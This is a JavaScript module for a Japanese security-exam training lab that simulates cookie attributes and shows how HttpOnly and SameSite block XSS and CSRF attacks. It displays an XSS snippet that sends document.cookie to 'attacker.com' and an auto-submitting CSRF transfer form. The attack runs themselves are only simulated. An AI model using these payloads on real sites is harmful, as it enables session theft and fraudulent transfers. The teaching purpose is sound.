/**
 * Module 13: Cookie & Web Security (HttpOnly, Secure, SameSite) Lab
 */
window.SecurityLabModules["cookie_security"] = {
    html: `
        <div class="lab-container">
            <!-- Navigation Tabs -->
            <div class="tab-container" style="display: flex; gap: 8px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; margin-bottom: 24px;">
                <button class="btn btn-tab active" id="btnTabCookieFlow" style="font-size: 13px; padding: 8px 16px;">① Cookie属性と送信制御</button>
                <button class="btn btn-tab" id="btnTabCookieAttack" style="font-size: 13px; padding: 8px 16px;">② 脆弱性・攻撃の実証 (XSS & CSRF)</button>
            </div>

            <!-- TAB 1: Cookie Flow -->
            <div id="panelCookieFlow" class="tab-panel active">
                <div class="card" style="margin-bottom: 24px;">
                    <h3>🍪 Cookie属性シミュレーター</h3>
                    <p class="card-subtitle">Cookieに付与する各種属性（HttpOnly, Secure, SameSite）と、接続プロトコルやリクエストの送信元による送信可否の違いをインタラクティブに検証します。</p>

                    <div class="lab-grid-3" style="grid-template-columns: 1fr 1.2fr 1.1fr; gap: 20px; margin-top: 15px;">
                        <!-- Left: Cookie Config Form -->
                        <div style="background: rgba(255,255,255,0.01); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 14px; display: flex; flex-direction: column; gap: 10px;">
                            <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px;">1. Cookie発行属性の設定</span>
                            
                            <div class="form-group" style="margin: 0; display: flex; align-items: center; justify-content: space-between;">
                                <label style="font-size: 11px; margin: 0;">HttpOnly属性:</label>
                                <input type="checkbox" id="cookieHttpOnly" checked style="width: auto;">
                            </div>
                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ JavaScript (document.cookie) からのアクセス可否</span>

                            <div class="form-group" style="margin: 0; display: flex; align-items: center; justify-content: space-between;">
                                <label style="font-size: 11px; margin: 0;">Secure属性:</label>
                                <input type="checkbox" id="cookieSecure" checked style="width: auto;">
                            </div>
                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ 暗号化通信 (HTTPS) 時のみ送信を許可</span>

                            <div class="form-group" style="margin: 0;">
                                <label style="font-size: 11px;">SameSite属性:</label>
                                <select id="cookieSameSite" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                    <option value="strict">Strict (厳格な送信制限)</option>
                                    <option value="lax" selected>Lax (標準的な送信制限)</option>
                                    <option value="none">None (無制限・クロスサイト送信可能)</option>
                                </select>
                            </div>
                            <span style="font-size: 9px; color: var(--text-secondary); margin-top: -6px;">※ クロスサイトリクエスト時の送信制限</span>

                            <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; border-bottom: 1px solid var(--border-color); padding-bottom: 4px; margin-top: 10px;">2. リクエスト送信条件</span>

                            <div class="form-group" style="margin: 0;">
                                <label style="font-size: 11px;">通信プロトコル:</label>
                                <select id="cookieProtocol" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                    <option value="https" selected>HTTPS (暗号化通信)</option>
                                    <option value="http">HTTP (非暗号化通信)</option>
                                </select>
                            </div>

                            <div class="form-group" style="margin: 0;">
                                <label style="font-size: 11px;">送信元・リクエストタイプ:</label>
                                <select id="cookieReqType" style="width: 100%; font-size: 11px; padding: 4px 8px; background-color: var(--bg-card); border-color: var(--border-color); color: var(--text-primary);">
                                    <option value="normal">通常リクエスト (自サイト内での遷移)</option>
                                    <option value="csrf_link">クロスサイト遷移 (GET: 攻撃サイトからのリンク)</option>
                                    <option value="csrf_post">クロスサイトPOST (POST: 攻撃サイトのフォーム送信)</option>
                                </select>
                            </div>

                            <div style="margin-top: 10px; display: flex; gap: 8px;">
                                <button class="btn btn-primary" id="btnSimulateCookie" style="flex: 1; font-size: 11px; padding: 6px;">シミュレーション実行</button>
                                <button class="btn" id="btnResetCookieFlow" style="font-size: 11px; padding: 6px; border: 1px solid var(--border-color); background: transparent;">リセット</button>
                            </div>
                        </div>

                        <!-- Middle: Send Sequence Animation & Result -->
                        <div style="display: flex; flex-direction: column; gap: 14px;">
                            <div>
                                <span style="font-weight: bold; color: var(--text-primary); font-size: 12px; display: block; margin-bottom: 6px;">リクエスト配送可否の可視化</span>
                                <div class="cookie-flow-visual" style="display: flex; justify-content: space-between; align-items: center; background: rgba(0,0,0,0.2); border: 1px solid var(--border-color); padding: 20px 14px; border-radius: var(--radius-md); position: relative; height: 80px;">
                                    <div style="text-align: center; z-index: 2;">
                                        <span style="font-size: 24px;" id="nodeClientBrowser">🌐</span>
                                        <div style="font-size: 8px; color: var(--text-secondary); margin-top: 2px;">ブラウザ</div>
                                    </div>
                                    <div class="flow-arrow" id="arrowClientToServer" style="flex: 1; border-top: 2px dashed #4b5563; height: 1px; margin: 0 10px; position: relative;">
                                        <div class="flow-dot" id="dotCookieFlow" style="display: none; position: absolute; top: -5px; left: 0; width: 8px; height: 8px; background-color: var(--color-primary); border-radius: 50%;"></div>
                                        <span id="labelCookiePacket" style="position: absolute; top: -20px; left: 50%; transform: translateX(-50%); font-size: 8px; padding: 2px 4px; border-radius: 4px; background: rgba(0,0,0,0.6); display: none;">🍪 SessionID</span>
                                    </div>
                                    <div style="text-align: center; z-index: 2;">
                                        <span style="font-size: 24px;" id="nodeTargetServer">🏢</span>
                                        <div style="font-size: 8px; color: var(--text-secondary); margin-top: 2px;">対象サーバー</div>
                                    </div>
                                </div>
                                <div style="text-align: center; font-size: 10px; color: var(--text-secondary); margin-top: 6px; min-height: 15px;" id="textCookieFlowStatus">待機中</div>
                            </div>

                            <div style="flex: 1; display: flex; flex-direction: column; min-height: 180px;">
                                <label style="font-size: 11px;">シミュレーション詳細判定:</label>
                                <div class="response-box" style="flex: 1; overflow-y: auto; background-color: #0c0a09; border-color: rgba(99,102,241,0.3); padding: 12px; font-family: var(--font-mono); font-size: 10px; line-height: 1.4; color: #fbbf24; display: flex; flex-direction: column; gap: 8px;">
                                    <div id="textCookieAttrHeader" style="border-bottom: 1px dashed rgba(255,255,255,0.1); padding-bottom: 4px; color: #34d399; font-weight: bold;">Set-Cookie ヘッダー例がここに表示されます。</div>
                                    <div id="textCookieSentResult" style="color: #fbbf24;">シミュレーションを実行してください。</div>
                                    <div id="textCookieJsResult" style="color: #60a5fa;">JavaScript からの読み取り可否も判定します。</div>
                                </div>
                            </div>
                        </div>

                        <!-- Right: Detailed Explanations & Exam tips -->
                        <div style="display: flex; flex-direction: column; gap: 14px;">
                            <div style="background: rgba(99,102,241,0.03); border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 14px; font-size: 11px; line-height: 1.5; color: var(--text-secondary);">
                                <span style="font-weight: bold; color: var(--text-primary); border-bottom: 1px solid var(--border-color); padding-bottom: 4px; display: block; margin-bottom: 8px;">💡 Cookie属性の解説</span>
                                <div style="display: flex; flex-direction: column; gap: 8px;">
                                    <div>
                                        <strong>■ HttpOnly 属性</strong><br>
                                        JavaScript（<code>document.cookie</code>）から Cookie へのアクセスを禁止します。XSS脆弱性によって悪意あるスクリプトがインジェクションされた場合でも、セッションID（Session ID）などの機密情報を盗み出されるのを防ぐ非常に強力な手段です。
                                    </div>
                                    <div>
                                        <strong>■ Secure 属性</strong><br>
                                        ブラウザに対し、暗号化通信（HTTPS）時のみ Cookie の送信を制限します。HTTP通信時に盗聴（中間者攻撃）されてセッションIDが漏洩するのを防止します。
                                    </div>
                                    <div>
                                        <strong>■ SameSite 属性</strong><br>
                                        クロスサイトリクエスト（外部サイトからのリクエスト）発生時の送信制御を担い、CSRF攻撃を防止します。
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>

            <!-- TAB 2: Cookie Vulnerabilities (XSS & CSRF) -->
            <div id="panelCookieAttack" class="tab-panel" style="display: none;">
                <div class="card" style="margin-bottom: 24px;">
                    <h3>🛡️ 攻撃実証: XSSとCSRFにおけるCookie防御効果</h3>
                    <p class="card-subtitle">Cookie属性の設定状態が、XSSによる「セッション強奪」や、CSRFによる「不正送金」などの攻撃に対してどのように防御能力を発揮するかを体験します。</p>

                    <div class="lab-grid-2" style="grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 15px;">
                        
                        <!-- Left Panel: XSS Attack Demo -->
                        <div style="border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; background: rgba(255, 255, 255, 0.01); display: flex; flex-direction: column; gap: 12px;">
                            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 6px;">
                                <span style="font-weight: bold; font-size: 13px; color: var(--text-primary);">🪲 シナリオ 1: XSS攻撃によるセッション盗聴</span>
                                <span id="badgeXssStatus" class="badge" style="font-size: 10px; padding: 2px 6px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
                            </div>

                            <p style="font-size: 11px; color: var(--text-secondary); margin: 0; line-height: 1.4;">
                                Webサイト上にXSS脆弱性があり、悪意あるスクリプトがインジェクションされた状況を再現します。攻撃スクリプトはブラウザ上で <code>document.cookie</code> を読み取り、攻撃者のサーバーへ送信しようと試みます。
                            </p>

                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 8px; border-radius: 4px; font-family: monospace; font-size: 9px; color: #f87171; line-height: 1.3;">
                                &lt;script&gt;<br>
                                &nbsp;&nbsp;const cookie = document.cookie;<br>
                                &nbsp;&nbsp;fetch('http://attacker.com/leak?data=' + encodeURIComponent(cookie));<br>
                                &lt;/script&gt;
                            </div>

                            <div style="display: flex; justify-content: space-between; align-items: center; gap: 10px;">
                                <div style="font-size: 11px;">
                                    現在の設定: <span id="textXssHttpOnlyStatus" style="font-weight: bold;">HttpOnly: ON</span>
                                </div>
                                <button class="btn btn-primary" id="btnExecuteXss" style="font-size: 11px; padding: 6px 12px;">XSS攻撃を実行</button>
                            </div>

                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 10px; color: #fbbf24;" id="logXssAttack">
                                攻撃を実行すると、悪意あるスクリプトの実行ログと結果がここに表示されます。
                            </div>
                        </div>

                        <!-- Right Panel: CSRF Attack Demo -->
                        <div style="border: 1px solid var(--border-color); border-radius: var(--radius-md); padding: 16px; background: rgba(255, 255, 255, 0.01); display: flex; flex-direction: column; gap: 12px;">
                            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 6px;">
                                <span style="font-weight: bold; font-size: 13px; color: var(--text-primary);">🕵️ シナリオ 2: CSRF攻撃による勝手な口座送金</span>
                                <span id="badgeCsrfStatus" class="badge" style="font-size: 10px; padding: 2px 6px; background-color: var(--bg-card); border: 1px solid var(--border-color);">未実行</span>
                            </div>

                            <p style="font-size: 11px; color: var(--text-secondary); margin: 0; line-height: 1.4;">
                                ユーザーが「ログイン状態」のまま、悪意あるサイト（罠サイト）にアクセスした状況を再現します。罠サイトに埋め込まれた自動送信フォームによって、正規サイトの送金API（POST）に向けて強制リクエストが走ります。
                            </p>

                            <div style="background: rgba(0,0,0,0.3); border: 1px solid var(--border-color); padding: 8px; border-radius: 4px; font-family: monospace; font-size: 9px; color: #f87171; line-height: 1.3;">
                                &lt;form action="https://bank.com/transfer" method="POST" id="csrfForm"&gt;<br>
                                &nbsp;&nbsp;&lt;input type="hidden" name="to" value="attacker"&gt;<br>
                                &nbsp;&nbsp;&lt;input type="hidden" name="amount" value="100000"&gt;<br>
                                &lt;/form&gt;<br>
                                &lt;script&gt;document.getElementById('csrfForm').submit();&lt;/script&gt;
                            </div>

                            <div style="display: flex; justify-content: space-between; align-items: center; gap: 10px;">
                                <div style="font-size: 11px;">
                                    現在の設定: <span id="textCsrfSameSiteStatus" style="font-weight: bold;">SameSite: Lax</span>
                                </div>
                                <button class="btn btn-primary" id="btnExecuteCsrf" style="font-size: 11px; padding: 6px 12px;">CSRF攻撃を実行</button>
                            </div>

                            <div class="response-box" style="height: 100px; overflow-y: auto; background-color: #0c0a09; padding: 10px; font-family: var(--font-mono); font-size: 10px; color: #fbbf24;" id="logCsrfAttack">
                                攻撃を実行すると、リクエスト送信時のCookie挙動と攻撃結果がここに表示されます。
                            </div>
                        </div>

                    </div>

                    <!-- Footnotes: Detailed SameSite specs -->
                    <div style="background: rgba(251,191,36,0.03); border: 1px solid rgba(251,191,36,0.2); border-radius: var(--radius-md); padding: 14px; font-size: 11px; line-height: 1.5; color: var(--text-secondary); margin-top: 20px;">
                        <span style="font-weight: bold; color: #fbbf24; border-bottom: 1px solid rgba(251,191,36,0.2); padding-bottom: 4px; display: block; margin-bottom: 8px;">🔑 セキスペ重要出題ポイント：SameSite 3属性の挙動</span>
                        <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 10px;">
                            <thead>
                                <tr style="border-bottom: 1px solid rgba(251,191,36,0.2); color: var(--text-primary);">
                                    <th style="padding: 4px;">属性値</th>
                                    <th style="padding: 4px;">同一サイト内 (First-party)</th>
                                    <th style="padding: 4px;">クロスサイトGET (外部リンク遷移)</th>
                                    <th style="padding: 4px;">クロスサイトPOST (CSRFフォーム等)</th>
                                    <th style="padding: 4px;">セキスペ出題対策</th>
                                </tr>
                            </thead>
                            <tbody>
                                <tr style="border-bottom: 1px dotted rgba(251,191,36,0.1);">
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">Strict</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px;">もっとも厳格。別サイトからの遷移リンクでもCookieが送信されないため、再ログインが必要になるデメリットがあります。</td>
                                </tr>
                                <tr style="border-bottom: 1px dotted rgba(251,191,36,0.1);">
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">Lax</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する (安全な遷移のみ)</td>
                                    <td style="padding: 6px; color: #f87171;">送信しない</td>
                                    <td style="padding: 6px;">標準設定。<b>GETによる通常の遷移（リンククリックなど）ではCookieが乗り、POST（フォーム送信等）では乗らない</b>ため、利便性とCSRF対策を両立します。</td>
                                </tr>
                                <tr>
                                    <td style="padding: 6px; font-weight: bold; color: var(--text-primary);">None</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: var(--color-success);">送信する</td>
                                    <td style="padding: 6px; color: #f87171;">いかなるクロスサイト通信でもCookieを送信します。<b>※None設定時には、必ず Secure属性の付与が義務付けられています (SameSite=None; Secure)</b>。</td>
                                </tr>
                            </tbody>
                        </table>
                    </div>

                </div>
            </div>
        </div>
    `,

    init: function(app) {
        // Tab switching
        const btnTabCookieFlow = document.getElementById("btnTabCookieFlow");
        const btnTabCookieAttack = document.getElementById("btnTabCookieAttack");
        const panelCookieFlow = document.getElementById("panelCookieFlow");
        const panelCookieAttack = document.getElementById("panelCookieAttack");

        btnTabCookieFlow.addEventListener("click", () => {
            btnTabCookieFlow.classList.add("active");
            btnTabCookieAttack.classList.remove("active");
            panelCookieFlow.style.display = "block";
            panelCookieAttack.style.display = "none";
            app.log("system", "[Cookieセキュリティ] 設定・送信制御画面に切り替えました。");
        });

        btnTabCookieAttack.addEventListener("click", () => {
            btnTabCookieFlow.classList.remove("active");
            btnTabCookieAttack.classList.add("active");
            panelCookieFlow.style.display = "none";
            panelCookieAttack.style.display = "block";
            
            // Sync status strings on the attack panels
            updateAttackStatusTexts();
            app.log("system", "[Cookieセキュリティ] XSS/CSRF攻撃実証画面に切り替えました。");
        });

        // Config elements
        const cookieHttpOnly = document.getElementById("cookieHttpOnly");
        const cookieSecure = document.getElementById("cookieSecure");
        const cookieSameSite = document.getElementById("cookieSameSite");
        const cookieProtocol = document.getElementById("cookieProtocol");
        const cookieReqType = document.getElementById("cookieReqType");

        // Action elements
        const btnSimulateCookie = document.getElementById("btnSimulateCookie");
        const btnResetCookieFlow = document.getElementById("btnResetCookieFlow");
        
        // Output elements
        const dotCookieFlow = document.getElementById("dotCookieFlow");
        const labelCookiePacket = document.getElementById("labelCookiePacket");
        const textCookieFlowStatus = document.getElementById("textCookieFlowStatus");
        const textCookieAttrHeader = document.getElementById("textCookieAttrHeader");
        const textCookieSentResult = document.getElementById("textCookieSentResult");
        const textCookieJsResult = document.getElementById("textCookieJsResult");

        // Attack elements
        const btnExecuteXss = document.getElementById("btnExecuteXss");
        const btnExecuteCsrf = document.getElementById("btnExecuteCsrf");
        const logXssAttack = document.getElementById("logXssAttack");
        const logCsrfAttack = document.getElementById("logCsrfAttack");
        const badgeXssStatus = document.getElementById("badgeXssStatus");
        const badgeCsrfStatus = document.getElementById("badgeCsrfStatus");
        const textXssHttpOnlyStatus = document.getElementById("textXssHttpOnlyStatus");
        const textCsrfSameSiteStatus = document.getElementById("textCsrfSameSiteStatus");

        function updateAttackStatusTexts() {
            const httponlyVal = cookieHttpOnly.checked ? "ON" : "OFF";
            const samesiteVal = cookieSameSite.value.toUpperCase();
            
            textXssHttpOnlyStatus.innerText = `HttpOnly: ${httponlyVal}`;
            textXssHttpOnlyStatus.style.color = cookieHttpOnly.checked ? "var(--color-success)" : "#f87171";
            
            textCsrfSameSiteStatus.innerText = `SameSite: ${samesiteVal}`;
            textCsrfSameSiteStatus.style.color = (samesiteVal === "STRICT" || samesiteVal === "LAX") ? "var(--color-success)" : "#f87171";
        }

        // Keep SameSite vs Secure requirement matching
        cookieSameSite.addEventListener("change", () => {
            if (cookieSameSite.value === "none") {
                cookieSecure.checked = true;
                cookieSecure.disabled = true;
                app.log("warning", "[仕様制約] SameSite=None を指定する場合、主要ブラウザの仕様により Secure属性の付与が必須になります。");
            } else {
                cookieSecure.disabled = false;
            }
        });

        function clearFlowAnimation() {
            dotCookieFlow.style.display = "none";
            dotCookieFlow.style.left = "0px";
            labelCookiePacket.style.display = "none";
            document.getElementById("nodeClientBrowser").style.transform = "none";
            document.getElementById("nodeTargetServer").style.transform = "none";
        }

        async function animatePacket(hasCookie) {
            clearFlowAnimation();
            
            // Highlight sender
            document.getElementById("nodeClientBrowser").style.transform = "scale(1.2)";
            await new Promise(r => setTimeout(r, 200));
            document.getElementById("nodeClientBrowser").style.transform = "none";

            // Show dot and optionally packet label
            dotCookieFlow.style.display = "block";
            dotCookieFlow.style.transition = "none";
            dotCookieFlow.style.left = "0px";
            
            if (hasCookie) {
                labelCookiePacket.style.display = "block";
            }

            await new Promise(r => setTimeout(r, 50));
            dotCookieFlow.style.transition = "left 1000ms linear";
            dotCookieFlow.style.left = "calc(100% - 8px)";
            
            await new Promise(r => setTimeout(r, 1050));
            
            dotCookieFlow.style.display = "none";
            labelCookiePacket.style.display = "none";
            
            // Highlight receiver
            document.getElementById("nodeTargetServer").style.transform = "scale(1.2)";
            await new Promise(r => setTimeout(r, 200));
            document.getElementById("nodeTargetServer").style.transform = "none";
        }

        // RESET FLOW
        btnResetCookieFlow.addEventListener("click", () => {
            clearFlowAnimation();
            textCookieFlowStatus.innerText = "待機中";
            textCookieAttrHeader.innerHTML = "Set-Cookie ヘッダー例がここに表示されます。";
            textCookieAttrHeader.style.color = "var(--text-secondary)";
            textCookieSentResult.innerHTML = "シミュレーションを実行してください。";
            textCookieSentResult.style.color = "var(--text-secondary)";
            textCookieJsResult.innerHTML = "JavaScript からの読み取り可否も判定します。";
            textCookieJsResult.style.color = "var(--text-secondary)";
            app.log("system", "[Cookieセキュリティ] 設定状態をリセットしました。");
        });

        // SIMULATE COOKIE SEND
        btnSimulateCookie.addEventListener("click", async () => {
            btnSimulateCookie.disabled = true;
            textCookieFlowStatus.innerText = "通信開始中...";
            
            const http_only = cookieHttpOnly.checked;
            const secure = cookieSecure.checked;
            const same_site = cookieSameSite.value;
            const protocol = cookieProtocol.value;
            const req_type = cookieReqType.value;

            try {
                // Call simulator backend API
                const response = await fetch("/api/cookie/simulate", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        http_only: http_only,
                        secure: secure,
                        same_site: same_site,
                        request_type: req_type,
                        use_https: (protocol === "https")
                    })
                });

                if (!response.ok) {
                    throw new Error("HTTP error " + response.status);
                }

                const result = await response.json();
                
                // Animate packet transmission
                textCookieFlowStatus.innerText = "ブラウザがCookie送信条件を検証中...";
                await animatePacket(result.cookie_sent);

                // Update UI elements based on response
                textCookieFlowStatus.innerText = result.cookie_sent ? "データ転送成功" : "送信ブロック";
                
                textCookieAttrHeader.innerHTML = `<span style="color: #60a5fa;">【レスポンスヘッダ】</span><br>${result.set_cookie_header}`;
                textCookieAttrHeader.style.color = "#a78bfa";

                if (result.cookie_sent) {
                    textCookieSentResult.innerHTML = `🟢 <b>Cookie送信成功</b>: ${result.reason}`;
                    textCookieSentResult.style.color = "var(--color-success)";
                } else {
                    textCookieSentResult.innerHTML = `🔴 <b>Cookie送信失敗</b>: ${result.reason}`;
                    textCookieSentResult.style.color = "#f87171";
                }

                if (result.js_readable) {
                    textCookieJsResult.innerHTML = `⚠️ <b>JS読込可能 (脆弱)</b>: ${result.js_reason}`;
                    textCookieJsResult.style.color = "#fbbf24";
                } else {
                    textCookieJsResult.innerHTML = `🛡️ <b>JSアクセス不可 (安全)</b>: ${result.js_reason}`;
                    textCookieJsResult.style.color = "var(--color-success)";
                }

                // Add to general app console log
                if (result.cookie_sent) {
                    app.log("success", `[Cookie送信] ${req_type === "normal" ? "同一サイト内" : "クロスサイト"}で Cookie が送信されました。`);
                } else {
                    app.log("error", `[Cookie送信ブロック] ${result.reason}`);
                }

            } catch (err) {
                app.log("error", "[APIエラー] CookieシミュレーションAPIの通信に失敗しました: " + err.message);
                textCookieFlowStatus.innerText = "通信エラー";
            } finally {
                btnSimulateCookie.disabled = false;
            }
        });

        // ----------------------------------------------------
        // ATTACK DEMOS
        // ----------------------------------------------------

        // XSS Attack Execution
        btnExecuteXss.addEventListener("click", async () => {
            btnExecuteXss.disabled = true;
            logXssAttack.innerHTML = "⚡ 悪意あるスクリプトを注入中...<br>";
            await new Promise(r => setTimeout(r, 600));
            
            const hasHttpOnly = cookieHttpOnly.checked;
            
            logXssAttack.innerHTML += "🔍 <code>document.cookie</code> の読み取りを試行します...<br>";
            await new Promise(r => setTimeout(r, 800));

            if (hasHttpOnly) {
                logXssAttack.innerHTML += `<span style="color: #34d399;">🛡️ 結果: 空白またはセッションIDが含まれません。</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #60a5fa;">[解説] HttpOnly属性が有効なため、ブラウザはスクリプトからのCookieアクセスを完全にブロックしました。攻撃者にセッションIDが漏洩するのを防御できました。</span>`;
                badgeXssStatus.innerText = "防御成功";
                badgeXssStatus.className = "badge badge-success";
                app.log("success", "[XSS攻撃実証] HttpOnlyが有効なため、悪意あるスクリプトによるセッションハイジャックを阻止しました。");
            } else {
                logXssAttack.innerHTML += `<span style="color: #f87171;">🚨 警告: Cookieの取得に成功しました！</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #fbbf24;">&nbsp;&nbsp;➔ 取得値: [session_id=sess_abc123]</span><br>`;
                logXssAttack.innerHTML += `<span style="color: #f87171;">📡 攻撃者サーバ (http://attacker.com/leak) へセッション情報を転送完了。アカウントが乗っ取られました。</span>`;
                badgeXssStatus.innerText = "攻撃成立";
                badgeXssStatus.className = "badge badge-danger";
                app.log("error", "[XSS攻撃実証] HttpOnlyが無効なため、悪意あるスクリプトによってセッションIDが窃取されました！");
            }

            btnExecuteXss.disabled = false;
        });

        // CSRF Attack Execution
        btnExecuteCsrf.addEventListener("click", async () => {
            btnExecuteCsrf.disabled = true;
            logCsrfAttack.innerHTML = "😈 罠サイトにアクセスしました...<br>";
            await new Promise(r => setTimeout(r, 500));
            
            logCsrfAttack.innerHTML += "📦 罠サイト内の非表示フォームから <code>https://bank.com/transfer</code> (送金API) へPOSTリクエストを自動送信します...<br>";
            await new Promise(r => setTimeout(r, 800));

            const samesite = cookieSameSite.value;

            // In real CSRF, browser determines Cookie attachment based on SameSite attribute
            if (samesite === "strict" || samesite === "lax") {
                logCsrfAttack.innerHTML += `<span style="color: #34d399;">🛡️ 結果: Cookieなしでのリクエストを検知。銀行サーバーが認証エラー「401 Unauthorized」を返しました。</span><br>`;
                logCsrfAttack.innerHTML += `<span style="color: #60a5fa;">[解説] SameSite=${samesite.capitalize()} 属性が有効なため、クロスサイトからのPOST送信時にブラウザがCookie（セッション情報）を添付するのを自動ブロックしました。CSRF攻撃を防ぎました。</span>`;
                badgeCsrfStatus.innerText = "防御成功";
                badgeCsrfStatus.className = "badge badge-success";
                app.log("success", `[CSRF攻撃実証] SameSite=${samesite.capitalize()} により、クロスサイトPOSTでのCookie添付が拒否され、不正送金を防止しました。`);
            } else {
                logCsrfAttack.innerHTML += `<span style="color: #f87171;">🚨 警告: ブラウザがCookie [session_id=sess_abc123] を自動添付して送信しました！</span><br>`;
                logCsrfAttack.innerHTML += `<span style="color: #f87171;">💸 口座から 100,000 円が攻撃者の口座へ送金されました（送金処理完了）。</span>`;
                badgeCsrfStatus.innerText = "攻撃成立";
                badgeCsrfStatus.className = "badge badge-danger";
                app.log("error", "[CSRF攻撃実証] SameSite=None なのでクロスサイトPOSTリクエストにCookieが添付され、不正送金（CSRF）が成功してしまいました！");
            }

            btnExecuteCsrf.disabled = false;
        });
    }
};
